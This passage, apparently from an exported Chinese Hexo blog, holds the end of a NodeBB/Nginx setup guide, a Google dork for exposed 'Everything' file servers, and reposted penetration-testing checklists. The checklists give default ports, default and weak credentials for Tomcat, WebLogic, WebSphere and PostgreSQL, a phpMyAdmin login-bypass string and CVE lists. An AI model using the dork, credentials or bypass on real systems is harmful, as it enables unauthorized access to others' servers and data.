<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled</span><br><span class="line">$ echo never &gt; /sys/kernel/mm/transparent_hugepage/defrag</span><br></pre></td></tr></table></figure>
<p>启动 MongoDB 服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ service mongod start</span><br></pre></td></tr></table></figure>
<p>新建数据库配置(详细可查看 配置MongoDB 篇)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mongo</span><br></pre></td></tr></table></figure>
<p>新建数据库：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; use nodebb # 新建数据库，名叫 nodebb</span><br></pre></td></tr></table></figure>
<p>添加用户角色：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.createUser( &#123; user: &quot;nodebb&quot;, pwd: &quot;nodebbpassword&quot;, roles: [ &quot;readWrite&quot; ] &#125; )</span><br></pre></td></tr></table></figure>
<p>如果要在NodeBB的管理控制面板（高级→数据库）中查看数据库统计信息，请键入以下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.grantRolesToUser(&quot;nodebb5&quot;,[&#123; role: &quot;clusterMonitor&quot;, db: &quot;admin&quot; &#125;]);</span><br><span class="line">&gt; exit</span><br></pre></td></tr></table></figure>
<p>打开 MongoDB 权限认证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ vim /etc/mongod.conf</span><br></pre></td></tr></table></figure>
<p>找到 security: 这一行，取消注释并改为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">security:</span><br><span class="line">   authorization: enabled</span><br></pre></td></tr></table></figure>

<p>重启 MongodB</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ service mongod restart</span><br></pre></td></tr></table></figure>
<h2 id="4-NODEBB安装"><a href="#4-NODEBB安装" class="headerlink" title="4.NODEBB安装"></a>4.NODEBB安装</h2><p>下载 NodeBB</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd /home #切换到你想要的位置即可</span><br><span class="line">$ git clone -b v1.12.x https://gitee.com/qiai365/NodeBB.git nodebb</span><br></pre></td></tr></table></figure>
<p>进入目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd /home/nodebb</span><br></pre></td></tr></table></figure>
<p>初始化 NodeBB，使用如下命令开始初始化：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cnpm install</span><br><span class="line">$ cnpm install sharp</span><br><span class="line">$ ./nodebb setup</span><br><span class="line">$ cnpm install --production</span><br><span class="line">$ ./nodebb setup</span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./nodebb dev</span><br></pre></td></tr></table></figure>
<p>如果都没报错的话可以使用下面的命令启动程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./nodebb start</span><br></pre></td></tr></table></figure>
<h2 id="5-NGINX安装"><a href="#5-NGINX安装" class="headerlink" title="5.NGINX安装"></a>5.NGINX安装</h2><p>安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ vim /etc/yum.repos.d/nginx.repo</span><br></pre></td></tr></table></figure>

<p>在文件内写入以下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[nginx]</span><br><span class="line">name=nginx repo</span><br><span class="line">baseurl=http://nginx.org/packages/rhel/$releasever/x86_64/</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure>
<p>开始安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ yum -y install nginx.x86_64</span><br></pre></td></tr></table></figure>

<p>配置 Nginx</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ vim /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure>

<p>在 http 语句块内追加上：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line"></span><br><span class="line">    server_name www.xxx.com;   #你的域名</span><br><span class="line"></span><br><span class="line">   location / &#123;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class="line">        proxy_set_header Host $http_host;</span><br><span class="line">        proxy_set_header X-NginX-Proxy true;</span><br><span class="line"></span><br><span class="line">        proxy_pass http://127.0.0.1:4567;</span><br><span class="line">        proxy_redirect off;</span><br><span class="line"></span><br><span class="line">        # Socket.IO Support</span><br><span class="line">        proxy_http_version 1.1;</span><br><span class="line">        proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">        proxy_set_header Connection &quot;upgrade&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>启动 Nginx</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ service nginx start</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./nodebb start</span><br></pre></td></tr></table></figure>

<p>现在你就可以通过访问你的域名来进入nodebb论坛程序了！</p>
<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>关于反向代理注意点：</p>
<p>问：在/etc/nginx/nginx.conf填上配置信息后，为什么直接访问域名还是nginx欢迎页面？</p>
<p>答：在/etc/nginx/nginx.conf中除了自己填写的server配置之外，还有一个关注点，那就是在http语句块中<br>include /etc/nginx/conf.d/*.conf这个不起眼的包含语句是致命的，这一句话会将/etc/nginx/conf.d/目录<br>下的一个默认配置default.conf优先处理，而这个默认的default.conf，正好是监听80端口。因为这个问题，我重置<br>了不下5遍服务器重新搭建。然后还是花了一天时间把nginx的官方文档看了一遍才知道的。<br>有人会说百度啊，谷歌啊啥的我咋没搜了，我搜了！但是人家仅仅只会说一句端口占用之类的话，而这个配置导致的问题<br>并不是端口占用，因为nginx不会同时加载这两个（/etc/nginx/nginx.conf、/etc/nginx/conf.d/default.conf），default的优先级更高！<br>所以没查出来端口占用！</p>
<h2 id="高级管理"><a href="#高级管理" class="headerlink" title="高级管理"></a>高级管理</h2><p>安装 forever维持进程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cnpm install forever -g # 这里必须加-g参数，不然可能装不上</span><br></pre></td></tr></table></figure>

<p>后台启动 NodeBB：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ forever start app.js</span><br></pre></td></tr></table></figure>

<p>停止 NodeBB：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ forever stop app.js</span><br></pre></td></tr></table></figure>

<p>查看后台的 NodeBB：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ forever list</span><br></pre></td></tr></table></figure>
<h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><p>关于nodebb我觉得非常好的东西：</p>
<ol>
<li>markdown编辑器，这是一个每个人都需要会的东西，极度轻简的编辑器带动着宇宙万物。markdown的使用语法，后续会由胖胖Bolooo2_7发出来。</li>
<li>socket.io，socket.io是基于WebSocket的C-S实时通信库，这个东西带动着我们现在论坛的实时聊天和几乎无延迟的消息队列，不信你可以打开一个人的头像发消息给他就知道了，比QQ的速度还要快。更重要的是，安全！！！所有的流量请求均通过WebSocket实现的，什么？抓包改包？你抓一个试试！</li>
<li>颜值，好看就完事了</li>
<li>其他的暂时还没想起来，想起来再补吧</li>
</ol>
]]></content>
      <tags>
        <tag>搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>Everything目录遍历</title>
    <url>/2019/05/26/Everything%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/</url>
    <content><![CDATA[<p>谷歌语法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inurl:Diagnostics/index</span><br></pre></td></tr></table></figure><a id="more"></a>

<p><img src="https://i.loli.net/2019/11/11/o8SYn6mCVTlRs19.png" alt="72038090-1f57-4688-9c69-dd709808be46-image.png"></p>
<p>点进去，可以看到所有的东西，注意！是所有的！包括管理员权限的文件</p>
<p><img src="https://i.loli.net/2019/11/11/iEvgaA1hzNDkHmw.png" alt="9f054c68-044f-4447-968f-adb75e42ded8-image.png"></p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>（一）渗透技巧—web</title>
    <url>/2019/04/15/%EF%BC%88%E4%B8%80%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94web/</url>
    <content><![CDATA[<blockquote>
<p>文章不记得从哪个公众号上拉下来的了</p>
</blockquote><a id="more"></a>
<h2 id="1、自定义-Web-应用"><a href="#1、自定义-Web-应用" class="headerlink" title="1、自定义 Web 应用"></a>1、自定义 Web 应用</h2><p>从公网直接攻击目标对外的 Web 应用，或者在授权的情况下在内网进行渗透测试，如果是入侵目的可以直接寻找注入、上传、代码执行、文件包含等高危漏洞，尝试获取系统权限，或者直接能拿到敏感数据。<br>允许扫描的话一般使用 WVS 直接扫描，也可以使用专门扫描特定漏洞的扫描工具如 sqlmap、XSStrike 等工具扫描特定类型的漏洞。不允许直接扫描，使用 Burp 手工慢慢找了。</p>
<h2 id="2、Web-中间件"><a href="#2、Web-中间件" class="headerlink" title="2、Web 中间件"></a>2、Web 中间件</h2><h3 id="（1）Tomcat"><a href="#（1）Tomcat" class="headerlink" title="（1）Tomcat"></a>（1）Tomcat</h3><p>Tomcat是Apache Jakarta软件组织的一个子项目，Tomcat是一个JSP/Servlet容器，它是在SUN公司的JSWDK（Java Server Web Development Kit）基础上发展起来的一个JSP和Servlet规范的标准实现，使用Tomcat可以体验JSP和Servlet的最新规范。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口号：8080</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   默认口令、弱口令，爆破，tomcat5 默认有两个角色：tomcat和role1。其中账号both、tomcat、role1的默认密码都是tomcat。弱口令一般存在5以下的版本中。</span><br><span class="line">•   在管理后台部署 war 后门文件</span><br><span class="line">•   远程代码执行漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://paper.seebug.org/399/</span><br><span class="line">http://www.freebuf.com/column/159200.html</span><br><span class="line">http://liehu.tass.com.cn/archives/836</span><br><span class="line">http://www.mottoin.com/87173.html</span><br></pre></td></tr></table></figure>
<h3 id="（2）Jboss"><a href="#（2）Jboss" class="headerlink" title="（2）Jboss"></a>（2）Jboss</h3><p>是一个运行EJB的J2EE应用服务器。它是开放源代码的项目，遵循最新的J2EE规范。从JBoss项目开始至今，它已经从一个EJB容器发展成为一个基于的 J2EE 的一个Web 操作系统（operating system for web），它体现了 J2EE 规范中最新的技术。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：8080</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   弱口令，爆破</span><br><span class="line">•   管理后台部署 war 后门</span><br><span class="line">•   反序列化</span><br><span class="line">•   远程代码执行</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.vuln.cn/6300</span><br><span class="line"></span><br><span class="line">http://mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html</span><br><span class="line"></span><br><span class="line">https://www.zybuluo.com/websec007/note/838374</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/u011215939/article/details/79141624</span><br></pre></td></tr></table></figure>
<h3 id="（3）WebLogic"><a href="#（3）WebLogic" class="headerlink" title="（3）WebLogic"></a>（3）WebLogic</h3><p>WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：7001，7002</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   弱口令、爆破，弱密码一般为weblogic/Oracle@123 or weblogic</span><br><span class="line">•   管理后台部署 war 后门</span><br><span class="line">•   SSRF</span><br><span class="line">•   反序列化漏洞</span><br><span class="line">•   weblogic_uac</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</span><br><span class="line"></span><br><span class="line">https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html</span><br><span class="line"></span><br><span class="line">https://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/</span><br><span class="line"></span><br><span class="line">https://bbs.pediy.com/thread-224954.htm</span><br></pre></td></tr></table></figure>
<h3 id="4）WebSphere"><a href="#4）WebSphere" class="headerlink" title="4）WebSphere"></a>4）WebSphere</h3><p>IBM公司一套典型的电子商务应用开发工具及运行环境。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：默认端口：908*；第一个应用就是9080，第二个就是9081；控制台9090</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   控制台登录爆破</span><br><span class="line">•   很多内网 websphere 的控制台存在弱口令 / 默认口令，可以使用 admin/admin 以及 webshpere/webshpere 这种口令登录。 通过该口令登录控制台后，可以部署 war 包，从而获取到 WEBSHELL 。</span><br><span class="line">•   反序列化</span><br><span class="line">•   任意文件泄露</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=WebSphere&amp;serverity=%E9%AB%98%E5%8D%B1</span><br><span class="line"></span><br><span class="line">http://www.fr1sh.com/wooyun_1/bug_detail.php?wybug_id=wooyun-2013-036803</span><br><span class="line"></span><br><span class="line">https://gist.github.com/metall0id/bb3e9bab2b7caee90cb7</span><br></pre></td></tr></table></figure>
<h2 id="3、Web-框架"><a href="#3、Web-框架" class="headerlink" title="3、Web 框架"></a>3、Web 框架</h2><h3 id="（1）Struts2"><a href="#（1）Struts2" class="headerlink" title="（1）Struts2"></a>（1）Struts2</h3><p>Struts2是一个优雅的,可扩展的框架,用于创建企业准备的Java Web应用程序。出现的漏洞也着实的多每爆一个各大漏洞平台上就会被刷屏。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line"></span><br><span class="line">•   S2-046 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10</span><br><span class="line">•   S2-045 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10</span><br><span class="line">•   S2-037 CVE-2016-4438 Struts 2.3.20-2.3.28.1</span><br><span class="line">•   S2-032 CVE-2016-3081 Struts 2.3.18-2.3.28</span><br><span class="line">•   S2-020 CVE-2014-0094 Struts 2.0.0-2.3.16</span><br><span class="line">•   S2-019 CVE-2013-4316 Struts 2.0.0-2.3.15.1</span><br><span class="line">•   S2-016 CVE-2013-2251 Struts 2.0.0-2.3.15</span><br><span class="line">•   S2-013 CVE-2013-1966 Struts 2.0.0-2.3.14</span><br><span class="line">•   S2-009 CVE-2011-3923 Struts 2.0.0-2.3.1.1</span><br><span class="line">•   S2-005 CVE-2010-1870 Struts 2.0.0-2.1.8.1</span><br><span class="line">参考：</span><br><span class="line">https://github.com/hktalent/myhktools</span><br><span class="line"></span><br><span class="line">https://github.com/Lucifer1993/struts-scan</span><br><span class="line"></span><br><span class="line">https://github.com/SecureSkyTechnology/study-struts2-s2-054_055-jackson-cve-2017-7525_cve-2017-15095</span><br></pre></td></tr></table></figure>
<h3 id="（2）Spring-框架"><a href="#（2）Spring-框架" class="headerlink" title="（2）Spring 框架"></a>（2）Spring 框架</h3><p>Spring Framework 是一个开源的Java／Java EE全功能栈（full-stack）的应用程序框架，以Apache License 2.0开源许可协议的形式发布，也有.NET平台上的移植版本。Spring Framework提供了一个简易的开发方式，这种开发方式，将避免那些可能致使底层代码变得繁杂混乱的大量的属性文件和帮助类。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   CVE-2010-1622</span><br><span class="line">•   CVE-2018-1274</span><br><span class="line">•   CVE-2018-1270</span><br><span class="line">•   CVE-2018-1273</span><br><span class="line">•   反序列化</span><br><span class="line">•   目录穿越</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.inbreak.net/archives/377</span><br><span class="line"></span><br><span class="line">https://www.secpulse.com/archives/71762.html</span><br><span class="line"></span><br><span class="line">http://www.open-open.com/news/view/1225d07</span><br><span class="line"></span><br><span class="line">https://xz.aliyun.com/t/2261</span><br><span class="line"></span><br><span class="line">https://xz.aliyun.com/t/2252</span><br></pre></td></tr></table></figure>
<h2 id="4、Web-服务器"><a href="#4、Web-服务器" class="headerlink" title="4、Web 服务器"></a>4、Web 服务器</h2><h3 id="IIS：Windows-的-WWW-服务器"><a href="#IIS：Windows-的-WWW-服务器" class="headerlink" title="IIS：Windows 的 WWW 服务器"></a>IIS：Windows 的 WWW 服务器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   https://masterxsec.github.io/2017/06/07/IIS-write-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</span><br><span class="line">•   http://www.freebuf.com/articles/4908.html</span><br><span class="line">•   https://www.anquanke.com/post/id/85811</span><br><span class="line">•   IIS，开启了 WebDAV，可以直接详服务器 PUT 文件</span><br><span class="line">•   短文件名枚举漏洞</span><br><span class="line">•   远程代码执行</span><br><span class="line">•   提权漏洞</span><br><span class="line">•   解析漏洞</span><br><span class="line">•   端口：80</span><br></pre></td></tr></table></figure>
<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   解析漏洞</span><br><span class="line">•   目录遍历</span><br><span class="line">•   端口：80</span><br></pre></td></tr></table></figure>
<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   https://www.seebug.org/vuldb/ssvid-92538</span><br><span class="line">•   解析漏洞</span><br><span class="line">•   目录遍历</span><br><span class="line">•   CVE-2016-1247：需要获取主机操作权限，攻击者可通过软链接任意文件来替换日志文件，从而实现提权以获取服务器的root权限。</span><br><span class="line">•   端口：80</span><br><span class="line">lighttpd</span><br><span class="line"></span><br><span class="line">•   目录遍历</span><br><span class="line">•   端口：80</span><br></pre></td></tr></table></figure>














]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>（三）渗透技巧—数据库、缓存、消息服务</title>
    <url>/2019/04/15/%EF%BC%88%E4%B8%89%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E3%80%81%E7%BC%93%E5%AD%98%E3%80%81%E6%B6%88%E6%81%AF%E6%9C%8D%E5%8A%A1/</url>
    <content><![CDATA[<blockquote>
<p>文章不记得从哪个公众号上拉下来的了</p>
</blockquote><a id="more"></a>
<h3 id="1、MySQL数据库"><a href="#1、MySQL数据库" class="headerlink" title="1、MySQL数据库"></a>1、MySQL数据库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：3306</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   爆破：弱口令</span><br><span class="line">•   身份认证漏洞：CVE-2012-2122</span><br><span class="line">•   拒绝服务攻击</span><br><span class="line">•   Phpmyadmin万能密码绕过：用户名：‘localhost’@’@” 密码任意</span><br><span class="line">•   提权</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://www.seebug.org/appdir/MySQL</span><br><span class="line">http://www.waitalone.cn/mysql-tiquan-summary.html?replytocom=390</span><br><span class="line">https://xz.aliyun.com/t/1491</span><br></pre></td></tr></table></figure>
<h3 id="2、MSSQL数据库"><a href="#2、MSSQL数据库" class="headerlink" title="2、MSSQL数据库"></a>2、MSSQL数据库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控）</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   爆破：弱口令/使用系统用户</span><br><span class="line">•   注入</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://www.anquanke.com/post/id/86011</span><br></pre></td></tr></table></figure>
<h3 id="3、Oracle数据库"><a href="#3、Oracle数据库" class="headerlink" title="3、Oracle数据库"></a>3、Oracle数据库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   爆破：弱口令</span><br><span class="line">•   注入攻击</span><br><span class="line">•   漏洞攻击</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html</span><br></pre></td></tr></table></figure>

<h3 id="4、PostgreSQL数据库"><a href="#4、PostgreSQL数据库" class="headerlink" title="4、PostgreSQL数据库"></a>4、PostgreSQL数据库</h3><p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：5432</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   爆破：弱口令：postgres postgres</span><br><span class="line">•   缓冲区溢出：CVE-2014-2669</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://drops.xmd5.com/static/drops/tips-6449.html</span><br><span class="line"></span><br><span class="line">https://www.secpulse.com/archives/69153.html</span><br></pre></td></tr></table></figure>
<h3 id="5、MongoDB数据库"><a href="#5、MongoDB数据库" class="headerlink" title="5、MongoDB数据库"></a>5、MongoDB数据库</h3><p>MongoDB，NoSQL数据库；攻击方法与其他数据库类似</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：27017</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   爆破：弱口令</span><br><span class="line">•   未授权访问；github有攻击代码；</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.cnblogs.com/LittleHann/p/6252421.html</span><br><span class="line"></span><br><span class="line">http://www.tiejiang.org/19157.html</span><br></pre></td></tr></table></figure>
<h3 id="6、Redis数据库"><a href="#6、Redis数据库" class="headerlink" title="6、Redis数据库"></a>6、Redis数据库</h3><p>Redis是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击方法：</span><br><span class="line">•   爆破：弱口令</span><br><span class="line">•   未授权访问+配合ssh key提权</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.alloyteam.com/2017/07/12910/</span><br></pre></td></tr></table></figure>
<h3 id="7、SysBase数据库"><a href="#7、SysBase数据库" class="headerlink" title="7、SysBase数据库"></a>7、SysBase数据库</h3><p>默认端口：服务端口5000；监听端口4100；备份端口：4200</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击方法：</span><br><span class="line">•   爆破：弱口令</span><br></pre></td></tr></table></figure>
<h3 id="8、DB2-数据库"><a href="#8、DB2-数据库" class="headerlink" title="8、DB2 数据库"></a>8、DB2 数据库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：5000</span><br><span class="line">攻击方法：</span><br><span class="line">•   安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）</span><br><span class="line">参考：</span><br><span class="line">http://23.94.222.93/bug_detail.php?wybug_id=wooyun-2015-0113071</span><br></pre></td></tr></table></figure>































]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>（五）渗透技巧—云环境</title>
    <url>/2019/04/15/%EF%BC%88%E4%BA%94%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E4%BA%91%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<blockquote>
<p>文章不记得从哪个公众号上拉下来的了</p>
</blockquote><a id="more"></a>
<h3 id="1、VMware"><a href="#1、VMware" class="headerlink" title="1、VMware"></a>1、VMware</h3><p>使用 VMware vCloud 可将现有数据中心内的虚拟基础架构资源池化，并将其作为基于目录的服务交付。通过与云计算基础架构的最佳平台 VMware vSphere 配合使用，VMware vCloud Director 可为客户提供构建安全的私有云，从而改变 IT 部门交付和管理基础架构服务以及用户访问和使用这些服务的方式。<br>一般组织中很多独立安装的 Esxi 形式的私有云，或独立部署的虚拟化系统。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口（很多）：</span><br><span class="line">https://kb.vmware.com/s/article/2115330</span><br><span class="line">https://kb.vmware.com/s/article/2081930</span><br><span class="line"></span><br><span class="line">漏洞：</span><br><span class="line">•   主机逃逸</span><br><span class="line">•   CVE-2017-5638</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://paper.seebug.org/348/</span><br><span class="line"></span><br><span class="line">http://www.freebuf.com/articles/system/141179.html</span><br><span class="line"></span><br><span class="line">http://www.mottoin.com/100651.html</span><br><span class="line"></span><br><span class="line">http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/4375.html</span><br><span class="line"></span><br><span class="line">Tweets by VMwareSRC</span><br><span class="line"></span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=vmware&amp;serverity=%E9%AB%98%E5%8D%B1&amp;page=1</span><br><span class="line"></span><br><span class="line">https://www.vmware.com/cn/security/hardening-guides.html</span><br></pre></td></tr></table></figure>
<h3 id="2、OpenStack"><a href="#2、OpenStack" class="headerlink" title="2、OpenStack"></a>2、OpenStack</h3><p>OpenStack是基础设施即服务（IaaS）软件，让任何人都可以自行创建和提供云计算服务。此外，OpenStack也用作创建防火墙内的“私有云”（Private Cloud），提供机构或企业内各部门共享资源。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">漏洞，有漏洞但是POC基本没有。检查时候可以参考安全的配置实践。</span><br><span class="line">•   权限绕过漏洞</span><br><span class="line">•   信息泄露</span><br><span class="line">•   代码执行漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=openstack&amp;serverity=%E9%AB%98%E5%8D%B1</span><br><span class="line"></span><br><span class="line">https://docs.openstack.org/liberty/zh_CN/install-guide-obs/environment-security.html</span><br><span class="line"></span><br><span class="line">http://www.freebuf.com/news/topnews/107203.html</span><br></pre></td></tr></table></figure>
<h3 id="3、Docker"><a href="#3、Docker" class="headerlink" title="3、Docker"></a>3、Docker</h3><p>Docker是一个开放源代码软件项目，让应用程序布署在软件容器下的工作可以自动化进行，借此在Linux操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制。</p>
<p>Docker利用Linux核心中的资源分脱机制，例如cgroups，以及Linux核心名字空间（name space），来创建独立的软件容器（containers）。这可以在单一Linux实体下运作，避免引导一个虚拟机造成的额外负担。</p>
<p>Linux核心对名字空间的支持完全隔离了工作环境中应用程序的视野，包括进程树、网络、用户ID与挂载文件系统，而核心的cgroup提供资源隔离，包括CPU、内存、block I/O与网络。</p>
<p>从0.9版本起，Dockers在使用抽象虚拟是经由libvirt的LXC与systemd - nspawn提供界面的基础上，开始包括libcontainer函数库做为以自己的方式开始直接使用由Linux核心提供的虚拟化的设施。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安全问题（很少有漏洞的POC，安全检查也是基于最佳实践和官方安全建议进行）：</span><br><span class="line">•   CVE-2015-3630 1.6.0 Docker Libcontainer 安全绕过漏洞</span><br><span class="line">•   CVE-2015-3627 1.6.1 Libcontainer和Docker Engine 权限许可和访问控制漏洞CVE-2015-3630 1.6.1 Docker Engine 安全绕过漏洞</span><br><span class="line">•   CVE-2014-9358 1.3.3 Docker 目录遍历漏洞</span><br><span class="line">•   CVE-2014-9357 1.3.2 Docker 权限许可和访问控制漏洞</span><br><span class="line">•   CVE-2014-6408 1.3.1 Docker 权限许可和访问控制漏洞</span><br><span class="line">•   CVE-2014-5277 1.3.0 Docker和docker-py 代码注入漏洞</span><br><span class="line">•   内核漏洞（Kernel exploits）容器是基于内核的虚拟化，主机（host）和主机上的所有容器共享一套内核。如果某个容器的操作造成了内核崩溃，那么反过来整台机器上的容器都会受到影响。</span><br><span class="line">•   拒绝服务攻击（Denial-of-service attacks）所有的容器都共享了内核资源，如果一个容器独占了某一个资源（内存、CPU、各种ID），可能会造成其他容器因为资源匮乏无法工作（形成DoS攻击）。</span><br><span class="line">•   容器突破（Container breakouts）Linux的namespace机制是容器的核心之一，它允许容器内部拥有一个PID=1的进程而在容器外部这个进程号又是不一样的（比如1234）。现在问题在于如果一个PID=1的进程突破了namespace的限制，那么他将会在主机上获得root权限。</span><br><span class="line">•   有毒镜像（Poisoned images）主要是考虑到镜像本身的安全性，没太多好说的。</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://toutiao.io/posts/2y9xx8/preview</span><br><span class="line"></span><br><span class="line">http://www.yunweipai.com/archives/21610.html</span><br><span class="line"></span><br><span 